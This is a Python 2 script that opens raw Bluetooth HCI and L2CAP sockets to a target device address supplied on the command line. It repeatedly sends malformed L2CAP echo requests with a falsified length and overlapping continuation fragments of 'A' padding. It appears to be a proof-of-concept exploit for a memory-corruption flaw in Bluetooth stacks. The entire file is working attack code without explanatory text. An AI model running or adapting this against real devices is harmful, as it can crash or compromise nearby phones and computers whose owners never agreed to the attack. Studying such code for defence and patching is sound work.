import sys
import socket
import struct
import time
from binascii import hexlify, unhexlify
from thread import start_new_thread
from random import randint, randrange
import os

echo = False
bt_addr = sys.argv[1]

os.system("hciconfig hci0 down")
time.sleep(0.2)
os.system("hciconfig hci0 up")
time.sleep(0.2)

def recv_l2cap():
    import os
    global hci
    global bt_addr
    global l2cap
    global echo
    global handle
    while True:
        try:
            pkt = l2cap.recv(1024)
            if ord(pkt[0]) == 0x9: #ECHO RESP
                print "ECHO", hexlify(pkt)
                echo = True
                time.sleep(1)
            else:
                print hexlify(pkt)
        except socket.error:
            import traceback; traceback.print_exc()
            os.system("hciconfig hci0 down")
            time.sleep(0.2)
            os.system("hciconfig hci0 up")
            time.sleep(0.2)
            hci = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_RAW, socket.BTPROTO_HCI)
            hci.setsockopt(socket.SOL_HCI, socket.HCI_DATA_DIR,1)
            hci.setsockopt(socket.SOL_HCI, socket.HCI_FILTER,'\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\x00\x00\x00\x00')
            hci.bind((0,))
            handle = 0
            l2cap = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_RAW, socket.BTPROTO_L2CAP)
            l2cap.connect((bt_addr, 0))
            while (handle == 0):
                pass
            echo = False
            print "hci reloaded"

handle = 0 #coonection handle

def recv_hci():
    import os
    global handle
    global hci
    global echo
    global l2cap
    global bt_addr
    while True:
        pkt = hci.recv(1024)
        if ord(pkt[0]) == 0x04 and ord(pkt[1]) == 0x03:
            if handle == 0:
                handle = struct.unpack("<H", pkt[4:6])[0]
                print "Got connection handle", handle
            print "HCI", hexlify(pkt)

hci = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_RAW, socket.BTPROTO_HCI)
hci.setsockopt(socket.SOL_HCI, socket.HCI_DATA_DIR,1)
hci.setsockopt(socket.SOL_HCI, socket.HCI_FILTER,'\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\x00\x00\x00\x00')
hci.bind((0,))
start_new_thread(recv_hci, ())

l2cap = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_RAW, socket.BTPROTO_L2CAP)
l2cap.connect((sys.argv[1], 0))
start_new_thread(recv_l2cap, ())

while handle == 0:
    pass


def send_echo_hci(ident, x, l2cap_len_adj=0, continuation_flags=0):
    l2cap_hdr = struct.pack("<BBH",0x8, ident, len(x) + l2cap_len_adj) #command identifier len
    acl_hdr = struct.pack("<HH", len(l2cap_hdr) + len(x) + l2cap_len_adj, 1) #len cid

    packet_handle = handle
    packet_handle |= continuation_flags << 12
    hci_hdr = struct.pack("<HH", packet_handle, len(acl_hdr) + len(l2cap_hdr) + len(x)) #handle, len
    while True:
        try:
            hci.send("\x02" + hci_hdr + acl_hdr + l2cap_hdr + x)
            break
        except socket.error:
            import traceback; traceback.print_exc()
            time.sleep(1)

if len(sys.argv) > 3:
    dst_l = int(sys.argv[2], 0)
    src_l = int(sys.argv[3], 0)
else:
    src_l = 70
    dst_l = 70

send_echo_hci(0  , "A"*(70))
i = 1
while True:
    send_echo_hci(i  , "A"*(dst_l), l2cap_len_adj=2)
    send_echo_hci(i+1, "A"*(src_l), continuation_flags=1)
    time.sleep(0.1)

    i = (i+1) % 250

raw_input("Done")
